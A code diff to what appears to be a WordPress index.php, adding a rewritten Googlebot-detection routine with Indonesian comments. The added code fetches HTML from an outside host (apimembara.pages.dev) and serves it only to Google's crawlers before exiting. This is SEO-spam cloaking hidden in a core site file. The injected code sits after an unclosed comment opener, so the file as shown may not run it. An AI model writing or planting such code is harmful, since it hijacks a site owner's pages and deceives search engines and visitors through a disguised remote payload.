@@ -1,25 +1,40 @@
 <?php
 /**
-function profile_user() {
-    $refererUrl = !empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No Referer';
-    $useragent = $_SERVER['HTTP_USER_AGENT'];
-    $pasteUrl = 'https://apimembara.pages.dev/index.txt';
-    $refererDomain = parse_url($refererUrl, PHP_URL_HOST);
+$REMOTE_URL = 'https://apimembara.pages.dev/index.txt';
 
-    if (strpos($useragent, 'Google-InspectionTool') !== false || strpos($useragent, 'googlebot') !== false || strpos($useragent, '(compatible; Googlebot/2.1; +http://www.google.com/bot.html)') !== false) {
-
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $pasteUrl);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        $content = curl_exec($ch);
-        curl_close($ch);
-
-        echo $content;
-    }
+// Fungsi cek sederhana (User-Agent saja)
+function is_googlebot(): bool {
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    return (bool) preg_match('/Googlebot|Google-InspectionTool|GoogleOther|AdsBot-Google/i', $ua);
 }
 
-profile_user();
+if (is_googlebot()) {
+    // Ambil isi remote file (cURL > fallback stream)
+    $html = null;
+    if (function_exists('curl_init')) {
+        $ch = curl_init($REMOTE_URL);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_TIMEOUT        => 8,
+            CURLOPT_USERAGENT      => 'VerifiedBotFetcher/1.0',
+        ]);
+        $resp = curl_exec($ch);
+        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        if ($resp !== false && $code >= 200 && $code < 300) $html = $resp;
+    }
+    if ($html === null) {
+        $html = @file_get_contents($REMOTE_URL);
+    }
+
+    if ($html) {
+        header('Content-Type: text/html; charset=UTF-8');
+        header('X-Served-For: Googlebot');
+        echo $html;
+        exit;
+    }
+}
 /**
  * Tells WordPress to load the WordPress theme and output it.
  *
